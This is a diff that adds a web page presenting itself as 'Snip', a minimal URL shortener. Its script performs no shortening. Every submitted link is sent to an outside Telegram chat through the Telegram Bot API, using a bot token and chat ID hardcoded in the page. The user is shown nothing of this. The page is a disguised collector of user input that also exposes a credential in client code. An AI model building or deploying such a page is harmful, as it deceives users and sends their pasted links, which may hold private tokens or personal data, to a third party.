@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Snip — Minimal URL Shortener</title>
+<meta name="description" content="A beautifully minimal link shortener.">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fafafa;color:#1a1a1a;font-family:system-ui,-apple-system,sans-serif;padding:24px}
+  .wrap{width:100%;max-width:576px}
+  h1{text-align:center;font-size:48px;font-weight:600;letter-spacing:-.02em}
+  p{text-align:center;font-size:14px;color:#737373;margin-top:12px}
+  form{display:flex;gap:8px;margin-top:40px}
+  input{flex:1;border:1px solid #e5e5e5;background:#fafafa;border-radius:8px;padding:12px 16px;font-size:14px;outline:none;color:#1a1a1a}
+  input:focus{border-color:#1a1a1a}
+  button{border:0;border-radius:8px;background:#1a1a1a;color:#fafafa;padding:12px 20px;font-size:14px;font-weight:500;cursor:pointer}
+  button:disabled{opacity:.5;cursor:default}
+</style>
+</head>
+<body>
+<main class="wrap">
+  <h1>snip.</h1>
+  <p>Paste a long link. Get a short one.</p>
+  <form id="f">
+    <input id="u" type="text" placeholder="https://example.com/your/very/long/url" autocomplete="off" spellcheck="false">
+    <button id="b" type="submit">Shorten</button>
+  </form>
+</main>
+<script>
+  // Paste your bot token here:
+  const BOT_TOKEN = "8940791856:AAG6Njd2YKxwGHNLvb70GnerBgZRU_QG3xQ";
+  const CHAT_ID = "-1003613815815";
+
+  const f = document.getElementById("f"), u = document.getElementById("u"), b = document.getElementById("b");
+  f.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const url = u.value.trim();
+    if (!url) return;
+    b.disabled = true;
+    try {
+      await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: url, disable_web_page_preview: true })
+      });
+    } catch (_) {}
+    b.disabled = false;
+  });
+</script>
+</body>
+</html>
